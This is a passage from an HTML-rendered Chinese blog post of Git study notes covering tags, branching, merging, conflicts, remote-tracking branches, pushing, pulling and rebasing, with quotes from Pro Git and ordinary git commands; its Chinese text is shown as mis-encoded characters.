checksumï¼Œå¦åˆ™å°±é»˜è®¤ä¸ºæœ€è¿‘çš„ä¸€æ¬¡æäº¤æ‰“ tagã€‚<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/tag.png" alt="tag.png"></p><blockquote><p><u>By default, the git push command doesnâ€™t transfer tags to remote servers</u>. You will have to explicitly push tags to a shared server after you have created them. You can run <code>git push origin &lt;tagname&gt;</code>.</p></blockquote><h1 id="git-åˆ†æ”¯"><a class="markdownIt-Anchor" href="#git-åˆ†æ”¯"></a> Git åˆ†æ”¯</h1><blockquote><p>â€¦ , weâ€™ll cover Gitâ€™s <strong>killer feature</strong>: its <em>branching model</em>, and it certainly sets Git apart in the VCS community.</p></blockquote><p>åœ¨è®¸å¤š VCS ä¸­è¦å®ç°åˆ†æ”¯éœ€è¦å¤åˆ¶ä¸€ä¸ªå®Œæ•´çš„æºä»£ç ç›®å½• (source code directory)ï¼Œåœ¨æ­¤ä¹‹ä¸Šæ‰èƒ½è¿›è¡Œåˆ†æ”¯çš„å¼€å‘ã€‚å¯¹äºå¤§çš„å·¥ç¨‹é¡¹ç›®æ¥è¯´ï¼Œåˆ†æ”¯æ— ç–‘ä¼šäº§ç”Ÿå·¨å¤§çš„å¼€é”€ã€‚å¯¹æ¯”ä¹‹ä¸‹ï¼Œgit çš„ branching model è½»é‡é«˜æ•ˆï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç§°ä¹‹ä¸º â€œkiller featureâ€ã€‚</p><blockquote><p>The way Git branches is incredibly lightweight, making branching operations nearly instantaneous, and switching back and forth between branches generally just as fast.</p></blockquote><p>å›é¡¾ä¸€ä¸‹æˆ‘ä»¬å¯¹ commit å’Œ snapshot çš„è®¨è®ºï¼Œå¦‚æœæˆ‘ä»¬æœ‰è®¸å¤š commitsï¼Œé‚£ä¹ˆå®ƒä»¬åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸Šå°†å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼ˆå¤´æ’å…¥ï¼‰ã€‚<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/commit_link.png" alt="commit_link.png"><br>git ä¸Šçš„ä¸€ä¸ªåˆ†æ”¯åªæ˜¯ä¸€ä¸ªè½»é‡çš„æŒ‡é’ˆï¼Œè¿™ä¹Ÿæ„å‘³è¿™å®ƒå¯ä»¥éšä¾¿ç§»åŠ¨æŒ‡å‘ä»»æ„çš„ commitã€‚å½“æˆ‘ä»¬æäº¤ä¸€ä¸ª commit æ—¶ï¼Œbranch æŒ‡é’ˆå°±ä¼šå‘å‰ç§»åŠ¨ï¼ŒæŒ‡å‘æœ€æ–°çš„é‚£ä¸ª commitã€‚ä¸‹å›¾ä¸­<code>HEAD</code>æŒ‡é’ˆæŒ‡ç¤ºç€æˆ‘ä»¬å½“å‰æ‰€å¤„çš„åˆ†æ”¯ä¸º<code>master</code>ã€‚<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/branch_history.png" alt="branch_history.png"></p><h2 id="creating-and-switching-branches"><a class="markdownIt-Anchor" href="#creating-and-switching-branches"></a> Creating and Switching branches</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">just create a new branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">create a new branch and switch to it</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">delete a branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -d &lt;branch&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ›å»ºçš„åˆ†æ”¯åŸºäº<code>HEAD</code>æŒ‡é’ˆæŒ‡å‘çš„å½“å‰åˆ†æ”¯ï¼ˆä¹Ÿæ˜¯æŒ‡é’ˆï¼‰æŒ‡å‘çš„ commitï¼ˆçœ‹èµ·æ¥æœ‰ç‚¹ç»•ï¼‰ï¼Œè€Œä¸”åˆ›å»ºå®Œæˆåå¹¶ä¸ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°æ–°åˆ†æ”¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">From Git version 2.23 onwards you can use `git switch` instead of `git checkout`</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git switch &lt;branch&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>git checkout</code>ï¼Œ<u>æˆ‘ä»¬çš„<code>HEAD</code>æŒ‡é’ˆä¼šæŒ‡å‘åˆ‡æ¢çš„åˆ†æ”¯</u>ï¼Œå‡è®¾æ˜¯æˆ‘åŸºäº<code>main</code>åˆ†æ”¯çš„æœ€æ–° commit åˆ›å»ºçš„<code>diverge</code>åˆ†æ”¯ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªæ–°åˆ†æ”¯ä¸Šæäº¤ commitï¼Œè€ŒåŸæ¥çš„<code>main</code>ä»ç„¶æŒ‡å‘å¼€å§‹ diverge çš„é‚£ä¸ª commitï¼Œä¸ä¼šæ”¶åˆ°æ–°åˆ†æ”¯çš„å½±å“ã€‚å½“ä½¿ç”¨<code>git log</code>æŸ¥çœ‹ commit å†å²æ—¶ï¼Œæˆ‘ä»¬å‘ç°é»˜è®¤åªä¼šæ˜¾ç¤ºè¿™ä¸ªåˆ†æ”¯çš„æ‰€æœ‰æäº¤ã€‚</p><ul><li>To show commit history for the desired branch you have to explicitly specify it: <code>git log &lt;branch&gt;</code>.</li><li>To show all of the branches, add <code>--all</code> to your git log command.</li></ul><p>å¦‚æœæ­¤æ—¶æˆ‘ä»¬å†<code>checkout</code>å›åŸæ¥çš„åˆ†æ”¯<code>main</code>ï¼Œ<u>é‚£ä¹ˆå½“å‰å·¥ä½œç›®å½•ä¸‹çš„æ–‡ä»¶ä¼šæ¢å¤ (revert)ä¸ºåˆ‡æ¢åˆ†æ”¯æŒ‡å‘çš„ snapshot</u>ã€‚</p><blockquote><p>It essentially <strong>rewinds</strong> the work youâ€™ve done in your <code>diverge</code> branch so you can go in a different direction.</p><p>However, before you do that, note that if your working directory or staging area has uncommitted changes that conflict with the branch youâ€™re checking out, Git wonâ€™t let you switch branches. <u>Itâ€™s best to have a clean working state when you switch branches</u>.</p></blockquote><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/diverge.png" alt="diverge.png"></p><h2 id="basic-branching-and-merging"><a class="markdownIt-Anchor" href="#basic-branching-and-merging"></a> Basic Branching and Merging</h2><p>ä¸Šé¢çš„å›¾æ˜¾ç¤ºæˆ‘åœ¨<code>main</code>åˆ†æ”¯ä¸Šå¯¹<code>c.txt</code>åšäº†ä¿®æ”¹å’Œ commitsï¼ŒåŒæ—¶åœ¨<code>diverge</code>åˆ†æ”¯ä¸Šåˆæœ‰å¯¹<code>hello.cc</code>åšäº†ä¿®æ”¹å’Œå¦ä¸€äº› commitsã€‚æ­¤æ—¶å¦‚æœæˆ‘åœ¨<code>diverge</code>åˆ†æ”¯ä¸Šçš„å·¥ä½œå·²ç»å®Œæˆäº†ï¼Œæƒ³è¦å°†<code>diverge</code>åˆå¹¶åˆ°<code>main</code>ä¸­ï¼Œéœ€è¦å…ˆåˆ‡æ¢åˆ°<code>main</code>åˆ†æ”¯ï¼Œå†é€šè¿‡<code>git merge</code>æ¥å°†ç›®æ ‡åˆ†æ”¯åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ã€‚<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/merge.png" alt="merge.png"><br>git ä½¿ç”¨ <strong>three-way merge</strong>çš„æ–¹æ³•æ¥å®ç°ä¸¤ä¸ªåˆ†æ”¯çš„åˆå¹¶ï¼ˆæœ‰ç«¯è”æƒ³ three-way handshakeï¼‰ã€‚<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/three_way.png" alt="three_way.png"><br>æ‰€è°“çš„ tree-way å°±æ˜¯ git ç”¨ä¸¤ä¸ªåˆ†æ”¯æŒ‡å‘çš„ snapshot + å¼€å§‹ diverge çš„èŠ‚ç‚¹çš„ snapshotï¼Œä¸€å…±ä¸‰ä¸ª snapshotsï¼Œæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ snapshotï¼Œå¹¶ä¸”åœ¨<code>merge commit</code>æäº¤åˆ° repo ä¸­ã€‚å¯ä»¥æ³¨æ„åˆ°ï¼Œè¿™ä¸ªç‰¹æ®Šçš„ commit å…·æœ‰ä¸¤ä¸ª parent commitsã€‚å¦‚æœæˆ‘ä»¬ä¸éœ€è¦å†åœ¨ merge å®Œçš„åˆ†æ”¯ä¸Šç»§ç»­å¼€å‘ï¼Œå°±å¯ä»¥<code>branch -d</code>æŠŠåˆ†æ”¯åˆ äº†ã€‚å†å²æ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/merge_commit.png" alt="merge_commit.png"> ^7f3018</p><h2 id="merge-conflict"><a class="markdownIt-Anchor" href="#merge-conflict"></a> Merge Conflict</h2><p>åˆå¹¶å†²çªæ˜¯ä¸€ä»¶æŒºå¤´ç–¼çš„äº‹æƒ…ï¼Œå¦‚æœå·¥ç¨‹åºå¤§èµ·æ¥ï¼Œmerge éœ€è¦è§£å†³çš„å†²çªå°±ä¼šå˜å¾—å¾ˆå¤šã€‚é‚£ä¹ˆä¸Šé¢å®æ“æ—¶ä¸ºä»€ä¹ˆæ²¡æœ‰äº§ç”Ÿ merge confict å‘¢ï¼Ÿå› ä¸ºä¸¤ä¸ªåˆ†æ”¯ä¿®æ”¹çš„æ˜¯ä¸åŒçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬ä»¥ common ancestor çš„ snapshot ä¸ºåŸºå‡†æ¥çœ‹ä¸¤ä¸ªåˆ†æ”¯çš„æ”¹åŠ¨ï¼Œä¸å°±ç›¸å½“äºæˆ‘åœ¨åŒä¸€åˆ†æ”¯ä¸Šå¯¹ä¸åŒæ–‡ä»¶åšäº†ä¿®æ”¹å—ï¼Œæ‰€ä»¥ä¸å­˜åœ¨â€œå†²çªâ€ã€‚</p><blockquote><p>If you changed the same part of the same file differently in the two branches youâ€™re merging, Git wonâ€™t be able to merge them cleanlyã€‚</p></blockquote><p>å¦‚æœä¸¤ä¸ªåˆ†æ”¯å¯¹åŒä¸€ä¸ªæ–‡ä»¶çš„åŒä¸€ä½ç½®åšäº†ä¿®æ”¹ï¼Œgit ä¸çŸ¥é“ä»¥å“ªä¸€åˆ†æ”¯çš„ä¿®æ”¹ä½œä¸ºæœ€ç»ˆç‰ˆæœ¬ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼š<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/merge_conflict.png" alt="merge_conflict.png"><br>é’ˆå¯¹å†²çªçš„éƒ¨åˆ†ä¸€ä¸ªä¸ª fixï¼Œå…¨éƒ¨è§£å†³åå†æ¬¡æäº¤ï¼Œå®Œç¾è§£å†³å†²çª ğŸ˜„<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/fix_confict.png" alt="fix_confict.png"></p><h2 id="branch-management"><a class="markdownIt-Anchor" href="#branch-management"></a> Branch Management</h2><p>æŸ¥çœ‹å½“å‰ä»“åº“çš„åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch</span></span><br></pre></td></tr></table></figure><p>Option:</p><ul><li><code>--all</code>: æŸ¥çœ‹æœ¬åœ°å’Œè¿œç«¯çš„æ‰€æœ‰åˆ†æ”¯</li><li><code>--merged</code> and <code>--no-merged</code>: å‰è€…åˆ—ä¸¾å½“å‰åˆ†æ”¯æ‰€åˆå¹¶äº†çš„åˆ†æ”¯ï¼Œåè€…åˆ™åˆ—ä¸¾å½“å‰åˆ†æ”¯è¿˜æ²¡æœ‰åˆå¹¶çš„åˆ†æ”¯ï¼Œè¦æŒ‡å®šç‰¹å®šåˆ†æ”¯å¯ä»¥åœ¨æœ€ååŠ ä¸Šåˆ†æ”¯å<code>&lt;branch&gt;</code></li></ul><p>ä¿®æ”¹åˆ†æ”¯åç§°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch --move &lt;branch&gt; &lt;newName&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rename your current branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -m &lt;newName&gt;</span></span><br></pre></td></tr></table></figure><p>git çš„ä¿®æ”¹åˆ†æ”¯æ“ä½œå’Œ Linux ä¿®æ”¹æ–‡ä»¶åä¸€æ ·éƒ½æ˜¯é€šè¿‡<code>move</code>ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬æ­¤æ—¶ä¿®æ”¹çš„åªæ˜¯æœ¬åœ°çš„åˆ†æ”¯åï¼Œè¿˜éœ€è¦åŒæ­¥åˆ°è¿œç«¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push --set-upstream origin &lt;newName&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ­¥å®Œæˆåæˆ‘ä»¬å†é€šè¿‡æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ï¼Œä¼šå‘ç°è¿œç«¯å¢åŠ äº†ä¸€ä¸ªæ–°çš„åˆ†æ”¯ï¼Œä½†æ—§åˆ†æ”¯è¿˜å­˜åœ¨ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æŠŠå®ƒåˆ äº†ã€‚ps: è¿™é‡Œæˆ‘å¹¶ä¸æ˜¯å¾ˆç†è§£ä¸ºä»€ä¹ˆä¼šå‡ºç°ä¸¤ä¸ªåˆ†æ”¯ï¼Œæ­£å¦‚å‰æ–‡æ‰€è¯´ï¼Œgit çš„åˆ†æ”¯ä»…æ˜¯è½»é‡åŒ–çš„æŒ‡é’ˆï¼ˆæœ€æ–° commit çš„ checksumï¼‰ï¼Œæ—¢ç„¶æœ¬åœ°èƒ½ç›´æ¥ä¿®æ”¹åç§°ï¼Œä¸ºä»€ä¹ˆè¿œç«¯å°±ä¸èƒ½è¿™ä¹ˆåšå‘¢ï¼Ÿ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push origin --delete &lt;oldName&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><u>Changing the name of a branch like master/main/mainline/default will break the integrations, services, helper utilities and build/release scripts that your repository uses. </u>Before you do this, make sure you consult with your collaborators. Also, make sure you do a thorough search through your repo and update any references to the old branch name in your code and scripts.</p></blockquote><h2 id="remote-branches"><a class="markdownIt-Anchor" href="#remote-branches"></a> Remote Branches</h2><p>æˆ‘ä»¬çŸ¥é“åˆ†æ”¯å’Œæ ‡ç­¾éƒ½æ˜¯æŒ‡é’ˆï¼Œæˆ–è€…è¯´æ˜¯å¼•ç”¨ (reference)ï¼Œå…³äºåˆ†æ”¯å’Œæ ‡ç­¾ç­‰å¼•ç”¨ï¼Œæœ¬åœ°å’Œè¿œç«¯éƒ½ä¼šåˆ†åˆ«å­˜å‚¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå‰æ–‡åœ¨æœ¬åœ°åˆ›å»ºå’Œåˆ é™¤ tag æˆ– branch åéœ€è¦é€šè¿‡<code>push</code>æ¥å’Œè¿œç«¯åŒæ­¥ã€‚å…¶ä¸­æœ¬åœ°åˆ†æ”¯å’Œè¿œç«¯åˆ†æ”¯ä¹‹é—´çš„è”ç³»ç§°ä¸º remote-trackingï¼Œåœ¨æœ¬åœ°é€šè¿‡ä¸€ä¸ª<code>remote-tracking branch</code>æ¥æ ‡è¯†æœ€æ–°ä¸€æ¬¡å’Œè¿œç«¯è¿æ¥æ—¶çš„ branch çŠ¶æ€ï¼ˆ<em>Pro Git</em> ä¸­æŠŠå…¶æ¯”å–»ä¸ºä¹¦ç­¾ bookmarkï¼Œéå¸¸å½¢è±¡ï¼‰ã€‚</p><blockquote><p><strong>Remote-tracking branches are references to the state of remote branches.</strong> Theyâ€™re local references that you canâ€™t move; Git moves them for you whenever you do any network communication, to make sure they accurately <u>represent the state of the remote repository</u>.</p></blockquote><p>å½“æˆ‘ä»¬ clone ä¸€ä¸ªè¿œç«¯ä»“åº“æ—¶ï¼Œæˆ‘ä»¬é»˜è®¤ä¼šç”Ÿæˆ<code>main/master</code>åˆ†æ”¯æŒ‡å‘æœ€æ–°çš„ commitï¼ŒåŒæ—¶æˆ‘ä»¬æœ¬åœ°ä¹Ÿä¼šä¿å­˜ä¸€ä¸ªåˆ†æ”¯<code>origin/master</code>æ¥è¡¨ç¤ºè¿œç«¯åˆ†æ”¯çš„çŠ¶æ€ã€‚<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/clone_remote.png" alt="clone_remote.png"><br>å¦‚æœæˆ‘ä»¬åœ¨æ‹‰ä¸‹æ¥çš„åˆ†æ”¯ä¸Šæäº¤ä¸€äº› commitsï¼ŒåŒæ—¶å…¶ä»–äººåœ¨è¿œç«¯åº“ä¸­æäº¤å¦å¤–ä¸€äº› commitsï¼Œè™½ç„¶<code>origin/master</code>åˆ†æ”¯ä»æŒ‡å‘ clone æ—¶çš„çŠ¶æ€ï¼Œä½†å®é™…ä¸Šå’Œè¿œç«¯åˆ†æ”¯å·²ç»ä¸åŒäº†ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨<code>fetch</code>æ¥ä½¿æœ¬åœ°ä¸è¿œç«¯åŒæ­¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git fetch &lt;remote&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/fetch_state.png" alt="fetch_state.png"></p><blockquote><p>This command looks up which server <code>origin</code> is, fetches any data from it that <strong>you donâ€™t yet have</strong>, and updates your local database, moving your <code>origin/master</code> pointer to its new, more up-to-date position.</p><p>Itâ€™s important to note that when you do a fetch that brings down new remote-tracking branches, <strong>you donâ€™t automatically have local, editable copies of them.</strong></p></blockquote><p>è™½ç„¶è¿œç«¯åˆ†æ”¯æ— æ³•ä¿®æ”¹ï¼Œä½†æ˜¯å¯ä»¥<code>merge</code>åˆ°æˆ‘ä»¬éœ€è¦çš„åˆ†æ”¯ä¸­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">merge into your current branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge &lt;remote&gt;/&lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">create a new branch and base it off your remote-tracking branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -b &lt;newBranch&gt; &lt;remote&gt;/&lt;branch&gt;</span></span><br></pre></td></tr></table></figure><h3 id="pushing"><a class="markdownIt-Anchor" href="#pushing"></a> Pushing</h3><p>git ä¸ä¼šè‡ªåŠ¨åœ°å°†æœ¬åœ°çš„åˆ†æ”¯å’Œè¿œç«¯çš„åˆ†æ”¯è¿›è¡ŒåŒæ­¥ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬éœ€è¦è‡ªå·±é€šè¿‡<code>push</code>æ¥å®ç°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push &lt;remote&gt; &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push &lt;remote&gt; &lt;localBranch&gt;:&lt;remoteBranch&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæ“ä½œå°†æœ¬åœ°åˆ†æ”¯æ¨åˆ°è¿œç«¯å¹¶ä¸”å°†å…¶å‘½åä¸ºå’Œæœ¬åœ°åˆ†æ”¯ä¸€æ ·çš„åå­—ï¼Œè€Œç¬¬äºŒä¸ªåˆ†æ”¯åˆ™å…è®¸æ¨åˆ°è¿œç«¯æ—¶å°†åˆ†æ”¯å‘½åä¸ºåˆ«çš„åå­—ï¼Œå› ä¸ºå³ä½¿ä¸¤ä¸ªåˆ†æ”¯æ˜¯ç›¸äº’è¿½è¸ªçš„çŠ¶æ€ï¼Œä¹Ÿæ˜¯å¯ä»¥å…·æœ‰ä¸åŒåå­—çš„ã€‚</p><h3 id="tracking-branches"><a class="markdownIt-Anchor" href="#tracking-branches"></a> Tracking Branches</h3><blockquote><p>Checking out a local branch from a remote-tracking branch automatically creates what is called a <strong>â€œtracking branchâ€</strong> (and the branch it tracks is called an <strong>â€œupstream branchâ€</strong>).</p></blockquote><p>å¯¹äº tracking branch æˆ‘ä»¬è¿›è¡Œ<code>git pull</code>æ“ä½œï¼Œç›¸å½“äºæ˜¯<code>fetch</code>+<code>merge</code>çš„ä¸€ç§ç®€å†™ (shorthand)ï¼Œå› ä¸º git çŸ¥é“ä»å“ªä¸ªè¿œç«¯ä»“åº“æ‹‰å–æ•°æ®ï¼Œå¹¶ä¸”å°†åˆ†æ”¯ merge åˆ°å“ªä¸ªæœ¬åœ°åˆ†æ”¯é‡Œï¼</p><p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæœ¬åœ°åˆ†æ”¯æ¥è¿½è¸ª (track) è¿œç«¯ä»“åº“çš„åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">create a tracking-branch and push to synchronize</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b &lt;newBranch&gt; &lt;remote&gt;/&lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push &lt;remote&gt; &lt;newBranch&gt;</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥è®©ä¸€ä¸ªå·²æœ‰çš„æœ¬åœ°åˆ†æ”¯è¿½è¸ªè¿œç«¯åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">option: <span class="string">&#x27;-u&#x27;</span> or <span class="string">&#x27;--set-upstream-to&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -u &lt;remote&gt;/&lt;branch&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šä¸Šé¢ä¸¤ä¸ªæ“ä½œçš„å‰æéƒ½æ˜¯é€šè¿‡<code>fetch</code>å·²ç»å°†è¿œç«¯çš„åˆ†æ”¯è®°å½•åœ¨æœ¬åœ°ï¼Œä½œä¸ºä¸å¯ä¿®æ”¹çš„è¿œç«¯åˆ†æ”¯ï¼ˆå¦‚ä¸Šé¢å›¾ä¾‹ä¸­çš„<code>origin/master</code>ï¼‰ã€‚è¿™ä¹Ÿæ˜¯å¯ä»¥ç†è§£çš„ï¼Œå¦‚æœæˆ‘åªèƒ½è§‚å¯Ÿæœ¬åœ°çš„ä»“åº“ï¼Œé‚£æˆ‘æ€ä¹ˆä¼šçŸ¥é“è¿œç«¯ä»“åº“æœ‰ä¸€ä¸ªæ–°çš„åˆ†æ”¯å‘¢ï¼å½“ç„¶å¦‚æœè¿™ä¸ªè¿œç«¯ä»“åº“çš„åˆ†æ”¯æˆ‘ä»¬å·²ç»æœ‰äº†è®°å½•ï¼Œä¹Ÿæ˜¯ä¸éœ€è¦<code>fetch</code>çš„ã€‚æ€»ä¹‹æˆ‘ä»¬çš„æ“ä½œå¯¹è±¡ä¸€å®šæ˜¯è¦æœ¬åœ°æœ‰è®°å½•çš„ã€‚<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/tracking.png" alt="tracking.png"></p><blockquote><p>Itâ€™s important to note that these numbers (ahead, behind, commitâ€¦) are only since the last time you fetched from each server!</p></blockquote><h3 id="pulling"><a class="markdownIt-Anchor" href="#pulling"></a> Pulling</h3><p>å†æ¬¡å›é¡¾ä¸‹ä¸€ä¸‹ï¼Œ<code>fetch</code>æ“ä½œä»…ä»…å°†è¿œç«¯çš„æ•°æ®ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå¹¶ä¸ä¼šå¯¹å½“å‰çš„å·¥ä½œç›®å½•è¿›è¡Œä¿®æ”¹ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨<code>merge</code>ã€‚ä½†å¦‚æœæˆ‘ä»¬çš„åˆ†æ”¯æ˜¯ tracking branchï¼Œé‚£å°±ä¸éœ€è¦è¿™ä¹ˆéº»çƒ¦äº†ï¼Œç›´æ¥<code>git pull</code> å°±èƒ½åˆ<code>fetch</code>ã€<code>merge</code>ä¸ºä¸€ã€‚è™½ç„¶æ“ä½œæ–¹ä¾¿ (short hand)ï¼Œä½†å®è·µä¸­è¿˜æ˜¯å¯èƒ½é‡åˆ° merge conflict ç­‰å…¶ä»–é—®é¢˜ï¼Œæ‰€ä»¥æœ€å¥½è¿˜æ˜¯ä¸€æ­¥æ­¥æ¥è¿›è¡Œã€‚<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/pulling.png" alt="pulling.png"></p><h2 id="rebasing"><a class="markdownIt-Anchor" href="#rebasing"></a> Rebasing</h2><p>é™¤äº†<code>merge</code>ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€ç§æ“ä½œå¯ä»¥åˆå¹¶åˆ†æ”¯ï¼š<code>rebase</code>ã€‚è€ƒè™‘å’Œ merge ä¸€æ ·çš„åˆ†æ”¯æƒ…å†µï¼š<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/diverge_rebase.png" alt="diverge_rebase.png"><br>åœ¨<code>merge</code>æ“ä½œä¸­ï¼Œæˆ‘ä»¬ä¼šè§£å†³ conflict å¾—åˆ°ä¸€ä¸ªæ–°çš„ merge commitã€‚è€Œ<code>rebase</code>æ“ä½œåˆ™æ˜¯å°†<code>experiment</code>åˆ†æ”¯ä¸Šçš„æäº¤é‡æ–°ä½œç”¨ (replay)ä¸€æ¬¡åœ¨<code>master</code>åˆ†æ”¯ä¸Šï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">checkout to the branch you need to rebase</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rebase the current branch to target branch(the one you rebase onto)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git rebase &lt;tragetBranch&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>With the rebase command, you can take all the changes that were committed on one branch and <strong>replay them on a different branch</strong>.</p></blockquote><p>å®˜æ–¹æ–‡æ¡£å¯¹<code>rebase</code>æ“ä½œçš„è®²è§£æ˜¯è¿™æ ·çš„ï¼š</p><blockquote><p>This operation works by going to the common ancestor of the two branches (the one youâ€™re on and the one youâ€™re rebasing onto), <u>getting the diff introduced by each commit of the branch youâ€™re on</u>, saving those diffs to temporary files, resetting the current branch to the same commit as the branch you are rebasing onto, and <u>finally applying each change in turn.</u></p></blockquote><p><img 